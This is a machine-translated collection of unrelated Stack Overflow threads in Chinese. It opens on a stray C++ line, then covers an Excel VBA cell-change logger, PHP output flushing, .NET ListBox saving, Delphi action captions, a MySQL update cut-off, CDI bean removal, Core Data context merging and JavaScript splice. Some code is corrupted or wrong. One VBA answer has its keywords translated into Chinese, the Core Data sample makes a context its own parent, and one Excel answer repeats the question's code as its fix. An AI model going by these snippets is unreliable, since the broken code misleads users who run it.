 cout<<"the value of s is"<< (pow(v,2) - pow(u,2))/ (2*a)<<".Dont forget unit!";
    // (v^2 - u^2) /2a 
```

# events - 如何使用 Excel VBA 制作外部日志？

> ID：10403517
> 
> 赞同：9
> 
> 时间：2012-05-01T19:59:54.267
> 
> 标签：events, logging, excel, vba

代码已更新以引用以下更改。

此日志系统为 Excel 创建一个名为 Log.txt 的外部文档，它将在 log.txt 文件中创建如下所示的一行：

> 上午 11:27:20 Matthew Ridge 将单元格 $N$55 从 ss 更改为

这不会告诉您是否有人在工作表中输入了新的代码行，但如果代码需要答案，它会告诉您该答案在哪个单元格中。下面的代码应该适用于 Mac 和 PC 系统的组合。如果人们发现它不请说。

此代码是在此处的人员和其他形式的帮助下创建的，因此我不能独资拥有该文档，但我可以拥有该概念的所有权。所以感谢那些提供帮助的人，如果没有这个，我认为现在就不会有一个可行的 Excel 日志记录系统；）

顺便说一句，在任何人惊慌失措并询问这段代码去哪里之前，这对普通/新的最终用户来说并不明显。你需要去**[开发者标签](http://msdn.microsoft.com/en-us/library/bb608625.aspx)**打开它，点击Visual Basic，当新窗口打开时寻找Microsoft Excel对象；该文件夹下应该是您的工作簿。您可以通过双击您希望代码所在的工作表将其放在 ThisWorkbook 下或任何工作表内。

在右侧面板上打开工作表后，您将看到 Option Explicit，如果您不这样做，最好通过确保选中**Require Variable Declaration来激活它。**这又可以在 Visual Basic 窗口中找到，并遵循以下路径：

**工具**->**选项**->**编辑器**。

如果它被检查，那么你不用担心，如果没有，那么你检查它。Option Explicit 对你的代码来说是一件好事，它会强制你声明变量，这是一个很好的开始。

验证后，您可以复制下面的代码，将其粘贴到您的工作簿中，或者根据您的需要粘贴到特定的工作表中。

## 2.01 版

```
Option Explicit
Dim PreviousValue

Private Sub Worksheet_Change(ByVal Target As Range)
    Dim sLogFileName As String, nFileNum As Long, sLogMessage As String

    sLogFileName = ThisWorkbook.Path & Application.PathSeparator & "Log.txt"

 On Error Resume Next ' Turn on error handling
    If Target.Value <> PreviousValue Then
        ' Check if we have an error
        If Err.Number = 13 Then
           PreviousValue = 0
        End If
        ' Turn off error handling
        On Error GoTo 0
        sLogMessage = Now & Application.UserName & " changed cell " & Target.Address _
        & " from " & PreviousValue & " to " & Target.Value

        nFileNum = FreeFile                         ' next file number
        Open sLogFileName For Append As #nFileNum   ' create the file if it doesn't exist
        Print #nFileNum, sLogMessage                ' append information
        Close #nFileNum                             ' close the file
    End If
End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    PreviousValue = Target(1).Value
End Sub 
```

随着时间的推移，我将尝试更新此代码以添加更多我认为合适的功能。

再次感谢所有帮助，非常感谢使这成为可能。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:31:42.287

问题是当您输入合并的单元格时，放入 PreviousValue (in `Worksheet_SelectionChange`) 的值是所有合并单元格的数组，您无法将其与新值进行比较。当`Worksheet_Change`在编辑上触发时，目标只是合并范围的左上角单元格。因此，让我们只跟踪该单元格的合并范围。将您的替换`Worksheet_SelectionChange`为以下内容：

```
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    PreviousValue = Target(1).Value
End Sub 
```

免责声明：这是在 Excel for Mac 2011 上测试的，因为我目前无法访问 Excel for Windows，但我很确定它也适用于 Excel for Windows。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-08-17T07:41:04.750

Matt Ridge - 我知道你要求一个关于一次完成多项更改的解决方案，而我只迟到了 3 年，但它是 :)。我对原始代码做了一些细微的修改，但这将处理合并的单元格并记录对单元格的多项更改。

```
    选项显式
暗淡上一个值（）Private Sub Worksheet_Change(ByVal Target As Range)
    Dim sLogFileName As String, nFileNum As Long, sLogMessage As String, r As Long

sLogFileName = ThisWorkbook.Path & Application.PathSeparator & "Log.txt" 

 'Check all cells for changes, excluding D4 D5 E5 M1 etc
For r = 1 To Target.Count 
    If Target(r).Value <> PreviousValue(r) And Intersect(Target(r), Range("D4,D5,E5,M1")) Is Nothing Then 
         ' Check if we have an error
        If Err.Number = 13 Then 
            PreviousValue(r) = 0 

        End If 
         ' Turn off error handling
         'On Error GoTo 0
         'log data into .txt file
        sLogMessage = Now & " " & Application.UserName & " changed cell " & Target(r).Address _ 
        & " in " & ActiveSheet.Name & " from " & "'" & PreviousValue(r) & "' to '" & Target(r).Value & "'" & " in workbook " & ThisWorkbook.Path & " " & ActiveWorkbook.Name 

        nFileNum = FreeFile ' next file number
        Open sLogFileName For Append As #nFileNum ' create the file if it doesn't exist
        Print #nFileNum, sLogMessage ' append information
        Close #nFileNum ' close the file
    End If 
Next r 
End Sub 

Private Sub Worksheet_SelectionChange(ByVal Target As Range) 
Dim i As Long 

 'looks at the uppermost cell (incase cells are merged)

Redim PreviousValue(1 To Target.Count) 
For i = 1 To Target.Count 
    PreviousValue(i) = Target(i).Value 
Next i      
    End sub 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-06-21T13:38:02.843

一年后，我修改了 Matthew 的代码 - 现在它也通过复制/粘贴或跟踪鼠标来跟踪更改，感谢 Matthew 的好主意！：

```
'Paste this into a Module:

Option Explicit

'SheetArray to hold the old values before any change is made
Public aSheetArr() As Variant

'helperfunctions for last row and last col of a given sheet:

Function LastRow(sh As Worksheet)
'get last row of a given worksheet
sh.EnableAutoFilter = False
    On Error Resume Next
    LastRow = sh.Cells.Find(What:="*", _
                            After:=sh.Range("A1"), _
                            LookAt:=xlPart, _
                            LookIn:=xlFormulas, _
                            SearchOrder:=xlByRows, _
                            SearchDirection:=xlPrevious, _
                            MatchCase:=False).Row
    On Error GoTo 0
End Function

Function LastCol(sh As Worksheet)
'get last col of a given worksheet
sh.EnableAutoFilter = False
    On Error Resume Next
    LastCol = sh.Cells.Find(What:="*", _
                            After:=sh.Range("A1"), _
                            LookAt:=xlPart, _
                            LookIn:=xlFormulas, _
                            SearchOrder:=xlByColumns, _
                            SearchDirection:=xlPrevious, _
                            MatchCase:=False).Column
    On Error GoTo 0
End Function

'Paste this into the workbook_Open method of your workbook (initializing the sheetarray)
Option Explicit

Private Sub Workbook_Open()
Dim lCol As Long
Dim lRow As Long

Dim wks As Worksheet
Set wks = Sheets(1)

lCol = LastCol(wks)
lRow = LastRow(wks)

aSheetArr = wks.Range(wks.Cells(1, 1), wks.Cells(lRow, lCol)) 'read the Range from the whole Sheet into the array

End Sub

'Paste this into the tablemodule - area where you want to log the changes:

Option Explicit
Private Sub Worksheet_Change(ByVal Target As Range)
'logging all the changes in a worksheet - also the copy/past's and track down's over ceveral cells

    Dim sLogFileName As String, nFileNum As Long, sLogMessage As String, r As Long

sLogFileName = ThisWorkbook.Path & Application.PathSeparator & "Log.txt"

 'Check all cells for changes, excluding D4 D5 E5 M1 etc
For r = 1 To Target.Count
    'compare each cell with the values from the old cell
    If Target(r).value <> aSheetArr(Target(r).Row, Target(r).Column) Then
         ' Check if we have an error
        If Err.Number = 13 Then
            PreviousValue(r) = 0

        End If
         ' Turn off error handling
         'On Error GoTo 0
         'log data into .txt file
        sLogMessage = Now & " " & Application.UserName & " changed cell " & Target(r).Address _
        & " in " & ActiveSheet.Name & " from " & "'" & aSheetArr(Target(r).Row, Target(r).Column) & "' to '" & Target(r).value & "'"

        'set the values in the array to the changed ones
        aSheetArr(Target(r).Row, Target(r).Column) = Target(r).value

        nFileNum = FreeFile ' next file number
        Open sLogFileName For Append As #nFileNum ' create the file if it doesn't exist
        Print #nFileNum, sLogMessage ' append information
        Close #nFileNum ' close the file
    End If
Next r
End Sub 
```

# php - 我如何使用 PHP 实现这个场景？

> ID：10403521
> 
> 赞同：4
> 
> 时间：2012-05-01T20:00:06.777
> 
> 标签：php, parallel-processing

我正在编写一个使用 C2DM 的 android 应用程序。当用户向服务器发送一些消息时，服务器会回复发送者并将该消息转发给网络中的一组其他用户。

问题是，对发件人的回复被延迟，直到消息被转发给所有其他人。这需要很多时间。我希望先将回复发送回发件人，然后执行转发过程。我怎样才能做到这一点...？如果我可以使用并行处理，我怎么能在 PHP 中做到这一点......？任何帮助将不胜感激:)

我用过这样的东西，

```
print(json_encode("Inserted Successfully"));//."   ".count($tags)));

while($row = mysql_fetch_row($result))
{
     $id = $row[0];
     sendMessageToUserID($id,"New Question !!",$ques_id,"yyyy");
} 
```

但是，这里“插入成功”不会发送给发送者，直到执行 while 循环之后。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T20:19:07.507

我不知道这是否可行，但您可以尝试添加`Content-Length:`和`Connection: close`标头，当然还有显式刷新输出。

编辑：试试这个

```
ob_start();
//output
header("Content-Length: ".ob_get_length());
header("Connection: close");
ob_end_flush();
//do other stuff 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T20:04:38.497

[Ob-Implicit-Flush](http://www.php.net/manual/en/function.ob-implicit-flush.php)应该可以解决问题。:)

# .net - .NET 中是否有等效的 SaveToFile 方法？

> ID：10403524
> 
> 赞同：0
> 
> 时间：2012-05-01T20:00:08.477
> 
> 标签：.net, listbox, delphi-prism, listboxitems

我想在 .NET 中使用 ListBox1.SaveToFile 方法，但我找不到与该方法等效的任何东西。我在 MSDN 图书馆网站上搜索过，但我空手而归。.NET 中是否有等效方法？

提前致谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:05:59.453

真棒的问题。您可以创建自己的超级酷方法！

```
public static class ListBoxExtensions
{
    public static IEnumerable<TData> GetData<TData>(this ListBox listbox)
    {
        var data = new List<TData>();
        foreach (var item in listbox.Items)
        {
            data.Add((TData) item);
        }
        return data;
    }

    public static void SetData<TData>(this ListBox listbox, IEnumerable<TData> dataToSet)
    {
        listbox.Items.Clear();

        foreach (var item in dataToSet)
        {
            listbox.Items.Add(item);
        }
    }
}

public static class SerializerHelper
{
    public static void Save<TXmlSerializableData>(IEnumerable<TXmlSerializableData> data, string outputFile)
        where TXmlSerializableData : class
    {
        if (File.Exists(outputFile))
        {
            File.Delete(outputFile);
        }
        var serializer = new XmlSerializer(typeof (TXmlSerializableData));
        using (var stream = File.OpenWrite(outputFile))
        {
            foreach (var item in data)
            {
                serializer.Serialize(stream, item);
            }
        }
    }

    public static IEnumerable<TData> Load<TData>(string inputFile)
        where TData: class
    {
        var result = new List<TData>();
        if (!File.Exists(inputFile))
        {
            return result;
        }
        var serializer = new XmlSerializer(typeof(TData));
        using (var stream = File.OpenRead(inputFile))
        {
            TData itemToAdd;
            do
            {
                itemToAdd = (TData) serializer.Deserialize(stream);
                if (itemToAdd != null)
                {
                    result.Add(itemToAdd);
                }
            } while (itemToAdd != null);
        }
        return result;
    }
}
var data = listbox.GetData<TSerializableType>();
SerializerHelper.Save(data, "Secret file.txt");
and your type must be serializable and marked with [XmlSerializable] attribute. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:02:38.310

我认为最明智的解决方案是将列表框的内容序列化为 XML

[http://msdn.microsoft.com/en-us/library/system.xml.serialization.xmlserializer.aspx](http://msdn.microsoft.com/en-us/library/system.xml.serialization.xmlserializer.aspx)

# delphi - 为另一个表单重命名 TAction

> ID：10403528
> 
> 赞同：4
> 
> 时间：2012-05-01T20:00:37.550
> 
> 标签：delphi, delphi-2010, c++builder-2010, taction

我有 2 个表格，我想分享一个`TActionManager`并分配`TAction`-s。

第一种形式是主要形式 - 它拥有`TActionManager`，`TAction`标题为“Action”。

Form1 的主菜单将此操作和菜单项标题属性设置为“操作 A”。Form2 包括 Form1 并且还将操作分配给 menuitem，并且标题设置为“操作 B”。

在设计期间，一切看起来都不错 - 菜单项在 Form1 和 Form2 中被命名为“Action A”和“Action B”，并且分配了相同的操作。它在运行时也可以正常工作（两种形式的 OnExecute 都得到了正确处理）。

但是 - 在运行时，Form1 菜单项具有标题“Action A”，而 Form2 具有菜单项标题“Action”，就像操作标题一样。

我是否错误地包含了它们，是否可以在 Form2 上包含 Form1 以共享操作和更改标题？它是 D2010 / CB2010 中的错误吗？

例子：

1.  创建 Form1 和 Form2 并将主菜单添加到两者
2.  将 TActionManager 拖放到 Form1 并在其中创建 Action1。
3.  在 Form1 Action1 中分配菜单项，然后修改 Caption（标题现在显示为粗体，表示从默认值更改）
4.  在 Form2 中分配菜单项以及 Action1（来自 Form1 TActionManager）并更改默认标题。
5.  现在在运行期间，Form1 已更改标题（不同于 Action1.Caption），并且 Form2 具有与 Action1.Caption 相同的标题，尽管标题应该是在步骤 4 中更改的新值。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T21:11:45.107

我复制了您的问题，确实，这是一种奇怪的行为。除了为什么要更改菜单项标题的明显问题之外，以下*应该*有效：

将两个菜单项的`Action`属性设置为相同的操作。现在菜单项的标题链接到动作的标题并注意它们不再存储（它们在对象检查器中显示为非粗体）。随后，将菜单项的标题更改为独立值，并注意它们现在已存储，并且菜单项在设计时确实会相应更改。

但在运行时，第二个菜单项的标题确实再次跟随动作的标题。在我看来，这不应该发生。

我没有重现的是无法在运行时更改它。以下按预期工作（此处为 D7）：

```
procedure TForm2.FormCreate(Sender: TObject);
begin
  mnuAction1.Caption := 'Action B';
end; 
```

确定要更改菜单项的标题而不是操作的标题？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T20:07:58.317

当操作链接到菜单项或更改操作标题时，TAction.Caption 将覆盖 TMenuItem.Caption。如果您在表单 Loaded 方法中更改菜单项标题，您应该能够为两个表单设置不同的标题。

# php - MySQL更新语句被切断

> ID：10403530
> 
> 赞同：1
> 
> 时间：2012-05-01T20:00:46.480
> 
> 标签：php, mysql

**免责声明**

在尝试结束这个问题之前，请理解我已经在 wordpress.se.com 上发布了它，甚至提供了赏金，但没有给出答案。这让我相信这个问题可能与 WordPress 本身无关，而是一些我还不明白的 php/mysql 怪癖。我希望我在下面为 php/mysql 专家提供了足够的信息，让我知道可能出了什么问题。

[链接到原始帖子](https://wordpress.stackexchange.com/questions/48692/post-content-getting-cut-off-on-blank-space-on-wpdb-update)

我遇到的问题是更新声明

```
UPDATE
    `s_6_posts`
SET
    `post_author` = 9,
    `post_date` = '2012-04-11 20:40:05',
    `post_date_gmt` = '2012-04-11 20:40:05',
    `post_content` = '\n\n\n<div class=\"WordSection1\">\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style=\'font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red\'>This is a new document</span></b></p>\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style=\'font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red\'> </span></b></p>\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style=\'font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red\'>Test Test Test</span></b></p>\n\n</div>\n\n\n',
    `post_content_filtered` = '',
    `post_title` = '',
    `post_excerpt` = '',
    `post_status` = 'draft',
    `post_type` = 'post',
    `comment_status` = 'open',
    `ping_status` = 'open',
    `post_password` = '',
    `post_name` = '',
    `to_ping` = '',
    `pinged` = '',
    `post_modified` = '2012-04-11 20:40:05',
    `post_modified_gmt` = '2012-04-11 20:40:05',
    `post_parent` = 0,
    `menu_order` = 0,
    `guid` = 'https://qa.citivelocity.com/cvauthor/equitywire/?p=230'
WHERE
    `ID` = 230 
```

在 php（WordPress 代码库）中执行时被切断。post_content 字段在数据库中的结果是

```
<div class="WordSection1">

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:normal"><b><span style='font-size:9.0pt;font-family:"ArialNarrow","sans-serif";color:red'>This is a new document</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:normal"><b><span style='font-size:9.0pt;font-family:"ArialNarrow","sans-serif";color:red'> 
```

**问题**

这里发生的事情是

```
<span style='font-size:9.0pt;font-family:"ArialNarrow","sans-serif";
    color:red'> </span> 
```

块，`<span>`标签之间的空间被切断后的所有内容。我已经能够与其他包含空间的数据一致地重现此问题。它似乎不是对字段的大小限制，因为无论数据的长度如何，截断总是发生在空间上。

这条 SQL 语句是在 WordPress 调试日志中输出的，我完全有理由相信它实际上是正在执行的语句。我通过 MySQL 客户端（Aqua Data Studio）运行了相同的语句，但没有发生中断。

我在 CentOs 上运行 Mysql 5.0.77 和 php 5.3。这些表是 MyISAM，排序规则是 utf8_general_ci。

发布表架构：

```
 CREATE TABLE `s_posts` (
      `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
      `post_author` bigint(20) unsigned NOT NULL DEFAULT '0',
      `post_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
      `post_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
      `post_content` longtext NOT NULL,
      `post_title` text NOT NULL,
      `post_excerpt` text NOT NULL,
      `post_status` varchar(20) NOT NULL DEFAULT 'publish',
      `comment_status` varchar(20) NOT NULL DEFAULT 'open',
      `ping_status` varchar(20) NOT NULL DEFAULT 'open',
      `post_password` varchar(20) NOT NULL DEFAULT '',
      `post_name` varchar(200) NOT NULL DEFAULT '',
      `to_ping` text NOT NULL,
      `pinged` text NOT NULL,
      `post_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
      `post_modified_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
      `post_content_filtered` text NOT NULL,
      `post_parent` bigint(20) unsigned NOT NULL DEFAULT '0',
      `guid` varchar(255) NOT NULL DEFAULT '',
      `menu_order` int(11) NOT NULL DEFAULT '0',
      `post_type` varchar(20) NOT NULL DEFAULT 'post',
      `post_mime_type` varchar(100) NOT NULL DEFAULT '',
      `comment_count` bigint(20) NOT NULL DEFAULT '0',
      PRIMARY KEY (`ID`),
      KEY `post_name` (`post_name`),
      KEY `type_status_date` (`post_type`,`post_status`,`post_date`,`ID`),
      KEY `post_parent` (`post_parent`),
      KEY `post_author` (`post_author`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:56:42.220

您没有发布处理数据库交互的代码（如何构建和执行查询），但是如果您`prepare`是字符串，则应按预期完整地插入/更新您的数据。

我运行了字符串`PDO::prepare`并导致：

```
6774 Query  update fulltext_test set post_content = '\\n\\n\\n<div class=\\\"WordSection1\\\">\\n\\n<p class=\\\"MsoNormal\\\" style=\\\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\\\"><b><span style=\'font-size:9.0pt;font-family:\\\"ArialNarrow\\\",\\\"sans-serif\\\";color:red\'>This is a new document</span></b></p>\\n\\n<p class=\\\"MsoNormal\\\" style=\\\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\\\"><b><span style=\'font-size:9.0pt;font-family:\\\"ArialNarrow\\\",\\\"sans-serif\\\";color:red\'> </span></b></p>\\n\\n<p class=\\\"MsoNormal\\\" style=\\\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\\\"><b><span style=\'font-size:9.0pt;font-family:\\\"ArialNarrow\\\",\\\"sans-serif\\\";color:red\'>Test Test Test</span></b></p>\\n\\n</div>\\n\\n\\n' WHERE id = 1 limit 1 
```

注意所有转义字符的转义。我验证数据插入mysql成功：

```
mysql> select * from fulltext_test\G
*************************** 1\. row ***************************
    id: 1
    comment: this is a test comment right here 123453432
    trimmed_comments: this 
    post_content: \n\n\n<div class=\"WordSection1\">\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style='font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red'>This is a new document</span></b></p>\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style='font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red'> </span></b></p>\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style='font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red'>Test Test Test</span></b></p>\n\n</div>\n\n\n 
```

和代码片段：

```
<?php

$dsn = 'mysql:dbname=zzz_test;host=127.0.0.1';

try {
    $dbo = new PDO($dsn, 'user', 'pass');
} catch (Exception $e) {
    var_dump($e->getMessage());
}

$string = '\n\n\n<div class=\"WordSection1\">\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style=\'font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red\'>This is a new document</span></b></p>\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style=\'font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red\'> </span></b></p>\n\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:normal\"><b><span style=\'font-size:9.0pt;font-family:\"ArialNarrow\",\"sans-serif\";color:red\'>Test Test Test</span></b></p>\n\n</div>\n\n\n';

$sql = 'update fulltext_test set post_content = :postContent WHERE id = 1 limit 1;';

$stmt = $dbo->prepare($sql);

$stmt->bindValue(':postContent', $string);

$stmt->execute(); 
```

所以，在执行查询之前尝试转义字符串，你应该是金子。作为记录，一切都是 UTF-8；连接、整理等

# cdi - CDI 如何删除有状态会话 bean？

> ID：10403531
> 
> 赞同：6
> 
> 时间：2012-05-01T20:00:47.927
> 
> 标签：cdi, ejb-3.1

规范说，当作用域的上下文即将被销毁时，CDI 容器会删除 SFSB。它如何准确地删除 EJB？它似乎没有调用带有@Remove 注释的方法。

```
@Stateful
public class CustomerDAOImpl implements CustomerDAO {
    @PreDestroy
    public void onDestroy() {
        //This is getting called as expected
    }
    @Remove
    public void deleteMyBean() {
        //This is not getting called!
    }
} 
```

因此，CDI 在技术上按照规范所说的那样做。问题是如何要求 EJB 容器移除实例？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-03T23:13:08.263

I think the CDI container needs a hook into the EJB container to ask it to "do what you'd do if an @Remove method had just completed". Looking at EJB spec, EJB 2.1 had a mechanism for this in the interfaces you had to extend.

For obvious reasons, the container calling an arbitrary @Remove annotated method for the side effect is pretty ill advised.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-01T19:32:15.410

正如 covener 所说，这是使用特定于实现的 EJB API 完成的，这不是 EJB 标准 API 的一部分。

正如 covener 所说，调用 @Remove*不是*正确的方法。@Remove 方法由用户代码调用，并*告诉*EJB 容器删除 EJB。如果要在删除 EJB 时进行回调，请使用 @PreDestroy。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-02T19:57:30.357

带有`@Remove`注解的方法必须由客户端显式调用，然后容器将`@PreDestroy`隐式调用带有注解的方法（如果存在）。之后，bean 实例将准备好进行垃圾回收。

这是客户端可以控制的唯一生命周期方法，所有其他方法都由容器控制。

# iphone - iPhone iOS 如何合并 Core Data NSManagedObjectContext？

> ID：10403538
> 
> 赞同：4
> 
> 时间：2012-05-01T20:01:49.143
> 
> 标签：iphone, objective-c, ios, core-data, nsmanagedobjectcontext

我正在尝试在后台下载一些 JSON 对象，并且正在执行相当多的多线程。操作完成后，我注意到此断言失败：

```
NSAssert([user.managedObjectContext isEqual:[AppUser managedObjectContext]],@"Different contexts"); 
```

**如何将更改合并到 [AppUser managedObjectContext] 定义的主上下文中？**

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-01T22:10:43.483

我真的建议您阅读**Marcus Zarra关于**[importing-and-displaying-large-data-sets-in-core-data](http://www.cimgf.com/2011/08/22/importing-and-displaying-large-data-sets-in-core-data/)的以下链接。

 **当您处理线程时，您创建的每个线程都需要有自己的上下文，如**jrturton**提供的链接中所写。然后如果你想合并一个主上下文（你在主线程中创建的那个）和另一个上下文（你在上下文中使用的那个）之间的变化，你需要`NSManagedObjectContextDidSaveNotification`在主线程中监听

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(contextHasChanged:) name:NSManagedObjectContextDidSaveNotification object:nil]; 
```

并进行合并

```
- (void)contextHasChanged:(NSNotification*)notification
{
  if ([notification object] == [self mainObjectContext]) return;

  if (![NSThread isMainThread]) {
    [self performSelectorOnMainThread:@selector(contextHasChanged:) withObject:notification waitUntilDone:YES];
    return;
  }

  [[self mainObjectContext] mergeChangesFromContextDidSaveNotification:notification];
} 
```

通知对象包含您在线程上下文中所做的更改。

**一些笔记**

线程很难实现。我提供的链接使用 an`NSOperation`及其上下文。这设置起来非常简单，但自从 iOS 5 以来，有一些功能可以让您的生活更轻松。

例如，要在不同的线程中创建上下文，您可以执行以下操作：

```
// create a context with a private queue so access happens on a separate thread.
NSManagedObjectContext *context = [[NSManagedObjectContext alloc] initWithConcurrencyType:NSPrivateQueueConcurrencyType];
// insert this context into the current context hierarchy
context.parentContext = context;
// execute the block on the queue of the context
[context performBlock:^{

      // do your stuff (e.g. a long import operation)

      // save the context here
      // with parent/child contexts, saving a context pushes the changes out of the current context
      NSError* error = nil;
      [context save:&error];
}]; 
```

此外，您可以查看`UIManagedDocument`. 这个类很好地集成了 Core Data 并允许您避免使用 Core Data 堆栈。

希望能帮助到你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T22:19:45.750

您的特殊情况（在后台下载 JSON）很常见。我已经看到了许多不需要多个上下文的实现。

在许多情况下，最简单也是迄今为止最可靠的方法是让执行下载的对象通过协议或完成下载的通知通知主线程。然后，您在主线程上进行保存。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-02T18:08:23.480

在我的情况下，我正在使用 RKObjectLoader 的子类，并且有太多的线程和操作来跟踪正在发生的事情。我发现可以通过要求加载的对象保存自己来很好地要求 RKObjectStore 为我合并更改。（在我要求`[AppUser managedObjectContext]`自救之前，这是**错误**的）

正确的解决方案涉及要求加载的对象将自己保存在自己的上下文中，如下所示：

```
- (void)objectLoader:(RKObjectLoader*)objectLoader didLoadObjects:(NSArray*)objects {

    AppUser* user = nil;
    for (id object in objects)
    {
         user = object;
    }
    NSError* error = nil;

/**this call fires the:    
//    - (void)mergeChanges:(NSNotification *)notification
within the rkmanagedobjectstore class and merges changes made in this background operation over to the main contxt
 */
 [[user managedObjectContext] save:nil];

} 
```**

# javascript - javascript拼接

> ID：10403539
> 
> 赞同：11
> 
> 时间：2012-05-01T20:02:16.300
> 
> 标签：javascript

我有一个数组 MyArray，我想删除位置 i 的一个元素。

我试过了：

```
MyArray = MyArray.splice(i, 1); 
```

但它返回的是我要删除的元素，而不是没有我要删除的元素的数组。

我确定这是一个简单的修复，无论如何，谢谢。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-05-01T20:06:28.530

改变

```
MyArray = MyArray.splice(i, 1); 
```

进入

```
MyArray.splice(i, 1); 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-05-01T20:06:27.360

您应该阅读[关于 splice 的文档](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/splice)

> ## 概括
> 
> 更改数组的内容，在删除旧元素的同时添加新元素。

原始数组被更改，而不是返回删除了指定元素的新数组。`MyArray.splice(i, 1);`应该足够了。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-01T20:06:42.313

splice() 是一种破坏性方法，因为它除了返回值之外还有副作用。当它返回删除的元素时，它会修改您传入的实际数组。

```
alert("Before: " + MyArray);
MyArray.splice(i, 1);
alert("After: " + MyArray); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-01T20:06:52.190

`splice`就地编辑数组。

```
var arr = [1, 2, 3, 4];
// arr is [1, 2, 3, 4];
var el = arr.splice(0, 1);
// el is [1], arr is now [2, 3, 4]. 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-01T20:04:45.250

你已经明白了！但是不要将其分配给新值..只需使用现有数组即可。

```
MyArray.splice(i, 1);
Something = MyArray; 
```

希望这可以帮助！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-09-13T10:02:19.847

## 句法

```
array.splice(index , howMany[, element1[, ...[, elementN]]]) 
```

## 描述

更改数组的内容，在删除旧元素的同时添加新元素。

## 返回

包含已移除元素的数组。如果仅删除一个元素，则返回一个包含一个元素的数组。如果没有元素被删除，则返回一个空数组。

来自[数组拼接方法 - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice?redirectlocale=en-US&redirectslug=JavaScript/Reference/Global_Objects/Array/splice)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-26T16:17:43.057

我遇到了类似的问题，特别是因为我只想删除数组中的特定项目，而不是与该项目匹配的所有项目。

我为 KO 可观察数组创建了这个扩展，这似乎有效。我还没有尝试过使用对象数组，但我不明白为什么这不起作用。

当我第一次学习 KO 时，我在处理 Arrays 时非常困难，所以我希望这对其他人有用：

JavaScript：

```
ko.observableArray.fn.removeAt = function (index) {
  this.valueWillMutate();
  this.splice(index, 1);
  this.valueHasMutated();
} 
```

HTML：

```
<div data-bind="foreach: Answers">
    <input type="text" data-bind="value: $data"/>
    <button 
        data-bind="click: function(){ $parent.Answers.removeAt($index()) }"                          
        title="Remove"
    >X</button>
</div> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-02-26T19:58:11.867

这是另一种方式（如果您仍想将其设置为变量并保持原始数组相同）：

```
// example array
var foo = ['1', '13', '44', '17', '17', '19', '1', '7', '17'];

// lets say we want to remove one of the 17s from the array
// convert array to string, do replacements, then convert back
var bar = foo.join().replace('17', '').replace(/\,\,/gi, ',').split(',');

// should log ['1', '13', '44', '17', '19', '1', '7', '17']
console.log(bar); 
```

